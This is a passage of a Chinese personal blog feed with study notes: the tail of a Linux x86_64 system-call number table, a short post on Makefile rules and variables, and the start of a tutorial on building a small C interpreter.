class="line">__SYSCALL(__NR_get_kernel_syms, sys_ni_syscall)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_query_module           178</span></span><br><span class="line">__SYSCALL(__NR_query_module, sys_ni_syscall)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_quotactl               179</span></span><br><span class="line">__SYSCALL(__NR_quotactl, sys_quotactl)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nfsservctl             180</span></span><br><span class="line">__SYSCALL(__NR_nfsservctl, sys_nfsservctl)</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* reserved for LiS/STREAMS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpmsg                181</span></span><br><span class="line">__SYSCALL(__NR_getpmsg, sys_ni_syscall)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_putpmsg                182</span></span><br><span class="line">__SYSCALL(__NR_putpmsg, sys_ni_syscall)</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* reserved for AFS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_afs_syscall            183</span></span><br><span class="line">__SYSCALL(__NR_afs_syscall, sys_ni_syscall)</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* reserved for tux */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tuxcall                184</span></span><br><span class="line">__SYSCALL(__NR_tuxcall, sys_ni_syscall)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_security               185</span></span><br><span class="line">__SYSCALL(__NR_security, sys_ni_syscall)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_gettid             186</span></span><br><span class="line">__SYSCALL(__NR_gettid, sys_gettid)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readahead              187</span></span><br><span class="line">__SYSCALL(__NR_readahead, sys_readahead)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setxattr               188</span></span><br><span class="line">__SYSCALL(__NR_setxattr, sys_setxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lsetxattr              189</span></span><br><span class="line">__SYSCALL(__NR_lsetxattr, sys_lsetxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsetxattr              190</span></span><br><span class="line">__SYSCALL(__NR_fsetxattr, sys_fsetxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getxattr               191</span></span><br><span class="line">__SYSCALL(__NR_getxattr, sys_getxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lgetxattr              192</span></span><br><span class="line">__SYSCALL(__NR_lgetxattr, sys_lgetxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fgetxattr              193</span></span><br><span class="line">__SYSCALL(__NR_fgetxattr, sys_fgetxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_listxattr              194</span></span><br><span class="line">__SYSCALL(__NR_listxattr, sys_listxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_llistxattr             195</span></span><br><span class="line">__SYSCALL(__NR_llistxattr, sys_llistxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_flistxattr             196</span></span><br><span class="line">__SYSCALL(__NR_flistxattr, sys_flistxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_removexattr            197</span></span><br><span class="line">__SYSCALL(__NR_removexattr, sys_removexattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lremovexattr           198</span></span><br><span class="line">__SYSCALL(__NR_lremovexattr, sys_lremovexattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fremovexattr           199</span></span><br><span class="line">__SYSCALL(__NR_fremovexattr, sys_fremovexattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tkill              200</span></span><br><span class="line">__SYSCALL(__NR_tkill, sys_tkill)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_time               201</span></span><br><span class="line">__SYSCALL(__NR_time, sys_time)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_futex              202</span></span><br><span class="line">__SYSCALL(__NR_futex, sys_futex)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setaffinity          203</span></span><br><span class="line">__SYSCALL(__NR_sched_setaffinity, sys_sched_setaffinity)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getaffinity          204</span></span><br><span class="line">__SYSCALL(__NR_sched_getaffinity, sys_sched_getaffinity)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_thread_area            205</span></span><br><span class="line">__SYSCALL(__NR_set_thread_area, sys_ni_syscall) <span class="comment">/* use arch_prctl */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_setup               206</span></span><br><span class="line">__SYSCALL(__NR_io_setup, sys_io_setup)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_destroy             207</span></span><br><span class="line">__SYSCALL(__NR_io_destroy, sys_io_destroy)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_getevents           208</span></span><br><span class="line">__SYSCALL(__NR_io_getevents, sys_io_getevents)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_submit              209</span></span><br><span class="line">__SYSCALL(__NR_io_submit, sys_io_submit)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_cancel              210</span></span><br><span class="line">__SYSCALL(__NR_io_cancel, sys_io_cancel)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_thread_area            211</span></span><br><span class="line">__SYSCALL(__NR_get_thread_area, sys_ni_syscall) <span class="comment">/* use arch_prctl */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lookup_dcookie         212</span></span><br><span class="line">__SYSCALL(__NR_lookup_dcookie, sys_lookup_dcookie)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_create           213</span></span><br><span class="line">__SYSCALL(__NR_epoll_create, sys_epoll_create)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_ctl_old          214</span></span><br><span class="line">__SYSCALL(__NR_epoll_ctl_old, sys_ni_syscall)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_wait_old         215</span></span><br><span class="line">__SYSCALL(__NR_epoll_wait_old, sys_ni_syscall)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_remap_file_pages           216</span></span><br><span class="line">__SYSCALL(__NR_remap_file_pages, sys_remap_file_pages)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getdents64             217</span></span><br><span class="line">__SYSCALL(__NR_getdents64, sys_getdents64)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_tid_address            218</span></span><br><span class="line">__SYSCALL(__NR_set_tid_address, sys_set_tid_address)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_restart_syscall            219</span></span><br><span class="line">__SYSCALL(__NR_restart_syscall, sys_restart_syscall)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_semtimedop             220</span></span><br><span class="line">__SYSCALL(__NR_semtimedop, sys_semtimedop)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fadvise64              221</span></span><br><span class="line">__SYSCALL(__NR_fadvise64, sys_fadvise64)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_create           222</span></span><br><span class="line">__SYSCALL(__NR_timer_create, sys_timer_create)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_settime          223</span></span><br><span class="line">__SYSCALL(__NR_timer_settime, sys_timer_settime)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_gettime          224</span></span><br><span class="line">__SYSCALL(__NR_timer_gettime, sys_timer_gettime)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_getoverrun           225</span></span><br><span class="line">__SYSCALL(__NR_timer_getoverrun, sys_timer_getoverrun)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_delete           226</span></span><br><span class="line">__SYSCALL(__NR_timer_delete, sys_timer_delete)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_settime          227</span></span><br><span class="line">__SYSCALL(__NR_clock_settime, sys_clock_settime)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_gettime          228</span></span><br><span class="line">__SYSCALL(__NR_clock_gettime, sys_clock_gettime)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_getres           229</span></span><br><span class="line">__SYSCALL(__NR_clock_getres, sys_clock_getres)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_nanosleep            230</span></span><br><span class="line">__SYSCALL(__NR_clock_nanosleep, sys_clock_nanosleep)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit_group             231</span></span><br><span class="line">__SYSCALL(__NR_exit_group, sys_exit_group)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_wait             232</span></span><br><span class="line">__SYSCALL(__NR_epoll_wait, sys_epoll_wait)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_ctl              233</span></span><br><span class="line">__SYSCALL(__NR_epoll_ctl, sys_epoll_ctl)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tgkill             234</span></span><br><span class="line">__SYSCALL(__NR_tgkill, sys_tgkill)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utimes             235</span></span><br><span class="line">__SYSCALL(__NR_utimes, sys_utimes)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vserver                236</span></span><br><span class="line">__SYSCALL(__NR_vserver, sys_ni_syscall)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mbind              237</span></span><br><span class="line">__SYSCALL(__NR_mbind, sys_mbind)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_mempolicy          238</span></span><br><span class="line">__SYSCALL(__NR_set_mempolicy, sys_set_mempolicy)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_mempolicy          239</span></span><br><span class="line">__SYSCALL(__NR_get_mempolicy, sys_get_mempolicy)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_open                240</span></span><br><span class="line">__SYSCALL(__NR_mq_open, sys_mq_open)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_unlink              241</span></span><br><span class="line">__SYSCALL(__NR_mq_unlink, sys_mq_unlink)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_timedsend           242</span></span><br><span class="line">__SYSCALL(__NR_mq_timedsend, sys_mq_timedsend)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_timedreceive            243</span></span><br><span class="line">__SYSCALL(__NR_mq_timedreceive, sys_mq_timedreceive)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_notify              244</span></span><br><span class="line">__SYSCALL(__NR_mq_notify, sys_mq_notify)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_getsetattr          245</span></span><br><span class="line">__SYSCALL(__NR_mq_getsetattr, sys_mq_getsetattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kexec_load             246</span></span><br><span class="line">__SYSCALL(__NR_kexec_load, sys_kexec_load)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_waitid             247</span></span><br><span class="line">__SYSCALL(__NR_waitid, sys_waitid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_add_key                248</span></span><br><span class="line">__SYSCALL(__NR_add_key, sys_add_key)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_request_key            249</span></span><br><span class="line">__SYSCALL(__NR_request_key, sys_request_key)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_keyctl             250</span></span><br><span class="line">__SYSCALL(__NR_keyctl, sys_keyctl)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioprio_set             251</span></span><br><span class="line">__SYSCALL(__NR_ioprio_set, sys_ioprio_set)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioprio_get             252</span></span><br><span class="line">__SYSCALL(__NR_ioprio_get, sys_ioprio_get)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_init           253</span></span><br><span class="line">__SYSCALL(__NR_inotify_init, sys_inotify_init)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_add_watch          254</span></span><br><span class="line">__SYSCALL(__NR_inotify_add_watch, sys_inotify_add_watch)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_rm_watch           255</span></span><br><span class="line">__SYSCALL(__NR_inotify_rm_watch, sys_inotify_rm_watch)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_migrate_pages          256</span></span><br><span class="line">__SYSCALL(__NR_migrate_pages, sys_migrate_pages)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_openat             257</span></span><br><span class="line">__SYSCALL(__NR_openat, sys_openat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mkdirat                258</span></span><br><span class="line">__SYSCALL(__NR_mkdirat, sys_mkdirat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mknodat                259</span></span><br><span class="line">__SYSCALL(__NR_mknodat, sys_mknodat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchownat               260</span></span><br><span class="line">__SYSCALL(__NR_fchownat, sys_fchownat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_futimesat              261</span></span><br><span class="line">__SYSCALL(__NR_futimesat, sys_futimesat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_newfstatat             262</span></span><br><span class="line">__SYSCALL(__NR_newfstatat, sys_newfstatat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unlinkat               263</span></span><br><span class="line">__SYSCALL(__NR_unlinkat, sys_unlinkat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_renameat               264</span></span><br><span class="line">__SYSCALL(__NR_renameat, sys_renameat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_linkat             265</span></span><br><span class="line">__SYSCALL(__NR_linkat, sys_linkat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_symlinkat              266</span></span><br><span class="line">__SYSCALL(__NR_symlinkat, sys_symlinkat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readlinkat             267</span></span><br><span class="line">__SYSCALL(__NR_readlinkat, sys_readlinkat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchmodat               268</span></span><br><span class="line">__SYSCALL(__NR_fchmodat, sys_fchmodat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_faccessat              269</span></span><br><span class="line">__SYSCALL(__NR_faccessat, sys_faccessat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pselect6               270</span></span><br><span class="line">__SYSCALL(__NR_pselect6, sys_pselect6)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ppoll              271</span></span><br><span class="line">__SYSCALL(__NR_ppoll,   sys_ppoll)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unshare                272</span></span><br><span class="line">__SYSCALL(__NR_unshare, sys_unshare)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_robust_list            273</span></span><br><span class="line">__SYSCALL(__NR_set_robust_list, sys_set_robust_list)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_robust_list            274</span></span><br><span class="line">__SYSCALL(__NR_get_robust_list, sys_get_robust_list)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_splice             275</span></span><br><span class="line">__SYSCALL(__NR_splice, sys_splice)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tee                276</span></span><br><span class="line">__SYSCALL(__NR_tee, sys_tee)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sync_file_range            277</span></span><br><span class="line">__SYSCALL(__NR_sync_file_range, sys_sync_file_range)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vmsplice               278</span></span><br><span class="line">__SYSCALL(__NR_vmsplice, sys_vmsplice)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_move_pages             279</span></span><br><span class="line">__SYSCALL(__NR_move_pages, sys_move_pages)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utimensat              280</span></span><br><span class="line">__SYSCALL(__NR_utimensat, sys_utimensat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __IGNORE_getcpu     <span class="comment">/* implemented as a vsyscall */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_pwait            281</span></span><br><span class="line">__SYSCALL(__NR_epoll_pwait, sys_epoll_pwait)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_signalfd               282</span></span><br><span class="line">__SYSCALL(__NR_signalfd, sys_signalfd)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timerfd                283</span></span><br><span class="line">__SYSCALL(__NR_timerfd, sys_timerfd)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_eventfd                284</span></span><br><span class="line">__SYSCALL(__NR_eventfd, sys_eventfd)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fallocate              285</span></span><br><span class="line">__SYSCALL(__NR_fallocate, sys_fallocate)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 2021年5月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[文章学习] Makefile</title>
      <link href="/2021/05/15/Makefile/"/>
      <url>/2021/05/15/Makefile/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>学习链接：<a href="https://seisman.github.io/how-to-write-makefile/">https://seisman.github.io/how-to-write-makefile/</a></p><p>好久之前收藏的，今天就不用在收藏夹接着吃灰了(=ﾟωﾟ)=</p><h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><h2 id="makefile规则"><a href="#makefile规则" class="headerlink" title="makefile规则"></a>makefile规则</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target: prerequisites</span><br><span class="line">    command</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><blockquote><p>target是一个文件，也可以是一个标签</p><p>prerequisites是生成该target所依赖的文件和target</p><p>command是该target要执行的命令</p></blockquote><p>举个栗子：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">edit : main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br><span class="line">    gcc -o edit main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br><span class="line"></span><br><span class="line">main.o : main.c defs.h</span><br><span class="line">    gcc -c main.c</span><br><span class="line">kbd.o : kbd.c defs.h command.h</span><br><span class="line">    gcc -c kbd.c</span><br><span class="line">command.o : command.c defs.h command.h</span><br><span class="line">    gcc -c command.c</span><br><span class="line">display.o : display.c defs.h buffer.h</span><br><span class="line">    gcc -c display.c</span><br><span class="line">insert.o : insert.c defs.h buffer.h</span><br><span class="line">    gcc -c insert.c</span><br><span class="line">search.o : search.c defs.h buffer.h</span><br><span class="line">    gcc -c search.c</span><br><span class="line">files.o : files.c defs.h buffer.h command.h</span><br><span class="line">    gcc -c files.c</span><br><span class="line">utils.o : utils.c defs.h</span><br><span class="line">    gcc -c utils.c</span><br><span class="line">clean :</span><br><span class="line">    rm edit main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br></pre></td></tr></table></figure><ul><li>在该目录下直接输入命令<code>make</code>，就可以生成执行文件。如果要删除文件。只需要执行<code>make clean</code>。</li></ul><blockquote><p>执行make指令后，计算机会自动寻找文件中的第一个目标文件target，在上面的例子中，它找到了edit，并把它作为最终的目标文件。</p><p>如果edit所依赖的后面的文件不存在，则会执行后面定义的命令生成。</p></blockquote><ul><li><p>make后面想加参数，必须得在makefile文件里写上标签。</p></li><li><p>反斜杠<code>\</code>是换行符的意思</p></li></ul><h2 id="makefile使用变量"><a href="#makefile使用变量" class="headerlink" title="makefile使用变量"></a>makefile使用变量</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">objects = main.o kbd.o command.o display.o \</span><br><span class="line">    insert.o search.o files.o utils.o</span><br><span class="line"><span class="comment">#定义变量</span></span><br><span class="line"></span><br><span class="line">edit : <span class="variable">$(objects)</span></span><br><span class="line">    cc -o edit <span class="variable">$(objects)</span></span><br><span class="line"><span class="comment">#调用变量</span></span><br></pre></td></tr></table></figure><p>感觉写这些差不多了，有问题再查。</p>]]></content>
      
      
      <categories>
          
          <category> 2021年5月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[文章学习] 手把手教你(x)我(√)构建解释器</title>
      <link href="/2021/05/11/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0-x-%E6%88%91-%E2%88%9A-%E6%9E%84%E5%BB%BA%E7%BC%96%E8%AF%91%E5%99%A8/"/>
      <url>/2021/05/11/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0-x-%E6%88%91-%E2%88%9A-%E6%9E%84%E5%BB%BA%E7%BC%96%E8%AF%91%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>链接：<a href="https://lotabout.me/2015/write-a-C-interpreter-0/">https://lotabout.me/2015/write-a-C-interpreter-0/</a></p><p>copy的代码<a href="https://github.com/Kazamayc/Kazamayc-Compiler/blob/main/Kazamayc-Compiler.c">在这里</a>(看完语法分析后反而不想重写了，所以就删掉然后copy了一份)</p><p>首先，高考结束啦！(＾o＾)ﾉ</p><p>在看csapp第八章之前，打算先把之前收藏的文章跟着学一遍。一直看书太无聊了，csapp第七章大概随便就翻了翻，程序员的自我修养也没看完，感觉记忆不深，跟没学一样，所以换换脑子。</p><p>不过有一说一，这个教程做的很不错了，所以我大概也只是抄抄|ω・´)</p><p>本文的目的是让我这个啥也不懂的小白，也能理解编译器(x)解释器(√)的构成。所以我不了解的专业名词都会查阅后在下方标注，如果有错误，请大佬们指点我一下，球球了(つд⊂)</p><h1 id="0x01-设计"><a href="#0x01-设计" class="headerlink" title="0x01 设计"></a>0x01 设计</h1><p>首先，我们写的是个<strong>解释器</strong>而不是编译器，因为解释器需要我们实现自己的虚拟机与指令集，能让我们更好的学习。(ﾟ3ﾟ)</p><blockquote><p>解释器：不产生目标代码，直接执行</p><p>编译器：将源代码转换成目标代码然后执行</p></blockquote><p>构建过程：</p><ol><li>构建虚拟机以及指令集</li><li>构建词法分析器，用于将字符串转化成内部的表示结构。</li><li>构建语法分析器，将词法分析得到的标记流（token）生成一棵语法树。</li></ol><p>我们的编译器主要包括 4 个函数：</p><ol><li><code>next()</code> 用于词法分析，获取下一个标记，它将自动忽略空白字符。</li><li><code>program()</code> 语法分析的入口，分析整个 C 语言程序。</li><li><code>expression(level)</code> 用于解析一个表达式。</li><li><code>eval()</code> 虚拟机的入口，用于解释目标代码。</li></ol><h1 id="0x02-虚拟机"><a href="#0x02-虚拟机" class="headerlink" title="0x02 虚拟机"></a>0x02 虚拟机</h1><h2 id="计算机内部工作原理"><a href="#计算机内部工作原理" class="headerlink" title="计算机内部工作原理"></a>计算机内部工作原理</h2><p>计算机中有三个基本部件需要我们关注：CPU、寄存器和内存。代码以二进制的形式保存在内存中；CPU从中一条一条地加载指令执行；程序运行的状态保存在寄存器中。</p><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>进程的内存会被分成几个段</p><ol><li>代码段(text)用于存放代码</li><li>数据段(data)用于存放初始化了的数据</li><li>未初始化数据段(bss)用于存放未初始化的数据</li><li>栈(stack)用于处理函数调用的相关数据</li><li>堆(heap)用于为程序动态分配内存</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">+------------------+</span><br><span class="line">|    stack   |     |      high address</span><br><span class="line">|    ...     v     |</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">|    ...     ^     |</span><br><span class="line">|    heap    |     |</span><br><span class="line">+------------------+</span><br><span class="line">| bss  segment     |</span><br><span class="line">+------------------+</span><br><span class="line">| data segment     |</span><br><span class="line">+------------------+</span><br><span class="line">| text segment     |      low address</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>我们的虚拟机只使用4个寄存器</p><ol><li><code>PC</code>程序计数器，存放一个内存地址，该地址存放下一条要执行的计算机指令。</li><li><code>SP</code>指针寄存器，永远指向当前栈顶。</li><li><code>BP</code>基址指针，指向栈的某些位置，在调用函数时会用到它。</li><li><code>AX</code>通用寄存器，它用于存放一条指令执行后的结果。</li></ol><h1 id="0x03-词法分析器"><a href="#0x03-词法分析器" class="headerlink" title="0x03 词法分析器"></a>0x03 词法分析器</h1><p>词法分析器用于对源码字符串做预处理，以减少语法分析器的复杂程度。词法分析器以源码字符串为输入，输出为标记流(token stream)。</p><p>每个标记通常包括：<code>(token, token value)</code>即标记本身和标记的值。例如，源码中若包含一个数字<code>&#39;998&#39;</code>，词法分析器将输出<code>(Number, 998)</code>，即（数字，998）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//例如:</span></span><br><span class="line"><span class="number">2</span> + <span class="number">3</span> * (<span class="number">4</span> - <span class="number">5</span>)</span><br><span class="line">=&gt;</span><br><span class="line">(Number, <span class="number">2</span>) Add (Number, <span class="number">3</span>) Multiply Left-Bracket (Number, <span class="number">4</span>) Subtract (Number, <span class="number">5</span>) Right-Bracket</span><br></pre></td></tr></table></figure><p>我们可以理解为，直接从源代码编译成汇编代码是比较困难的，因为输入的字符串比较难处理。所以我们先编写一个词法分析器将字符串转换成标记流，然后再由编译器把标记流转换成汇编。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">                   +-------+                      +--------+</span><br><span class="line">-- source code --&gt; | lexer | --&gt; token stream --&gt; | parser | --&gt; assembly</span><br><span class="line">                   +-------+                      +--------+</span><br></pre></td></tr></table></figure><h2 id="词法分析器的实现"><a href="#词法分析器的实现" class="headerlink" title="词法分析器的实现"></a>词法分析器的实现</h2><p>我们不会一次性把所有源码转换成token stream，因为保存所有的token stream是没有意义且浪费空间的，并且字符串与代码的上下文是有关系的。</p><p>词法分析器会把扫描到的标识符(变量名的标识)全部保存到一张表中，遇到新的标识符就去查这张表，如果标识符已经存在，就返回它的唯一标识。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">identifier</span> &#123;</span></span><br><span class="line">    <span 